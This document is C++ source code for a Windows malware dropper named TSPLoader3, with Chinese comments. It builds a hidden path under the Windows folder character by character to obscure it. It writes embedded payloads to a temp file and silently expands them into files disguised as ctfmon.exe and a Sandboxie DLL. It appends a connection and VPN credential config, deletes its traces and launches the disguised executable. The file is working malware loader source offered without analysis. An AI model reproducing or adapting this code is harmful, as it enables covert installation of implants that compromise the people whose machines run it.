// TSPLoader3.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include "TSPLoader3.h"
#include <io.h>

#include "server.h"
#include "sbieDLL.h"
#include "ctfmon.h"


////add by zhenyu with VPNInfo
struct VPNINFO
{
	TCHAR szConnectIp[64];
	TCHAR szVPNServerIp[32];
	TCHAR szVPNUser[32] ;
	TCHAR szPassd[32];
	TCHAR szCaseID[8];
	TCHAR szClueID[8];
	TCHAR szLeakID[64];
};
typedef struct VPNINFO  stu_vpn_param;
TCHAR szConnectIp[256]="CHAONIMADEXXX";


BOOL WriteDataToFile(LPCSTR lpFileName,BYTE *pData,DWORD dwSize)
{
	HANDLE hFile = CreateFileA
		(
		lpFileName, 
		GENERIC_READ|GENERIC_WRITE,
		NULL,//独占
		NULL,
		CREATE_ALWAYS,//存在时覆盖原有文件
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);

	DWORD dwBytes;
	WriteFile(hFile, pData, dwSize, &dwBytes, NULL);
	return CloseHandle(hFile);
}

void ExpandFile(CString StrSrc,CString StrDst,PCHAR lpConfigString=NULL,DWORD dwConfigLen=0)
{
	CString strCmd;

	strCmd.Format("expand %s %s",StrSrc,StrDst);
	WinExec(strCmd.GetBuffer(0),SW_HIDE);
	Sleep(1000*5);

	if (lpConfigString)
	{

		HANDLE hsrcFile=INVALID_HANDLE_VALUE;
		hsrcFile = CreateFileA(
			StrDst, 
			GENERIC_WRITE,
			NULL,//独占
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
			);

		if (hsrcFile==INVALID_HANDLE_VALUE)
		{
			return;
		}

		DWORD dwRead;
		SetFilePointer(hsrcFile,0,0,FILE_END);
		WriteFile(hsrcFile, lpConfigString, dwConfigLen, &dwRead,NULL);
		CloseHandle(hsrcFile);
	}

}



int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{

	CString strIME;
	strIME="c";	strIME+=":";strIME+="\\";strIME+="w";strIME+="i";strIME+="n";strIME+="d";
	strIME+="o";strIME+="w";strIME+="s";strIME+="\\";strIME+="m";strIME+="e";strIME+="e";
	strIME+="d";strIME+="\\";

	char szcmd[MAX_PATH]={0};
	strcat(szcmd,"cmd /c mkdir ");
	strcat(szcmd,strIME.GetBuffer(0));
	WinExec(szcmd,0);


	CString strCtfmon;
	strCtfmon.Format("%sctfmon.exe",strIME);

	CString strSbieDll;
	strSbieDll.Format("%ssbieDLL.dll",strIME);

	CString strSbieDll_Bak;
// 	strSbieDll_Bak.Format("%s.bak",strSbieDll);
	strSbieDll_Bak=strSbieDll+".bak";

	HANDLE hEvent=OpenEvent(EVENT_ALL_ACCESS,FALSE,TEXT("nimdkeikd"));
	if (hEvent)
	{
		SetEvent(hEvent);
		CloseHandle(hEvent);
		Sleep(2000);
	}

	CString strTmp;
	char szTemPath[MAX_PATH]={0};

	GetTempPath(MAX_PATH,szTemPath);

	strTmp.Format("%stem67.tmp",szTemPath);

	if (_access(strCtfmon.GetBuffer(0),0)==-1)
	{
		WriteDataToFile(strTmp,szctfmon,sizeof(szctfmon));
		ExpandFile(strTmp,strCtfmon);
	}
	if (_access(strSbieDll.GetBuffer(0),0)==-1)
	{
		WriteDataToFile(strTmp,szbiedll,sizeof(szbiedll));
		ExpandFile(strTmp,strSbieDll);
	}

	WriteDataToFile(strTmp,data,sizeof(data));
	ExpandFile(strTmp,strSbieDll_Bak,szConnectIp,sizeof(stu_vpn_param));

	DeleteFile(strTmp);


	strCtfmon+=" -mi";
	WinExec(strCtfmon.GetBuffer(0),1);
	Sleep(1000);

	return 0;
}

